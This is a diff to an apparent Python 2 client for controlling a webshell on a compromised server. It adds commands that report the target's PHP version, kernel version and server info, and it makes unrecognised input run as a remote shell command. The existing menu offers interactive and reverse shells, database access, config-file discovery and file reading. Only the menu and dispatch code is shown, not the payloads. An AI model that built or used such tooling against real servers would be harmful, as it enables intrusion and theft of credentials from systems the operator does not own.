@@ -22,13 +22,16 @@ def show_help():
 
 def main_help():
     print "Commands : "
-    print "        0. [h|help|?] : show this help"
+    print "        0. [h|help|?|\\n] : show this help"
     print "        1. [sh|shell] : start an interactive shell"
     print "        2. [rsh|rshell] : start an reverse shell"
     print "        3. [db|database] : database manager"
     print "        4. [c|config] : find the config files"
-    print "        4. [r|read] : read file"
-    print "        5. [q|quit|exit] : quit"
+    print "        5. [r|read] : read file"
+    print "        6. [kv|kernel_version] : kernel version"
+    print "        7. [pv|php_version] : php version"
+    print "        8. [p|print] : print target server info"
+    print "        9. [q|quit|exit] : quit"
 
 def main():
     banner()
@@ -58,6 +61,12 @@ def main():
             port = raw_input("[PORT] : ") or "8888"
             Log.info("Starting reverse shell (%s:%s)" % (ip, port))
             webshell.reverse_shell(ip, port)
+        elif context == "p" or context == "print":
+            webshell.print_info()
+        elif context == "pv" or context == "php_version":
+            webshell.get_php_version()
+        elif context == "kv" or context == "kernel_version":
+            webshell.get_kernel_version()
         elif context == "c" or context == "config":
             Log.info("Detacting config files...")
             webshell.get_config_file()
@@ -87,7 +96,9 @@ def main():
             break
         else:
             Log.error("Unsupported command!")
-            main_help()
+            Log.warning("Using shell command")
+            webshell.auto_exec_print(context)
+            # main_help()
 
 if __name__ == "__main__":
     main()
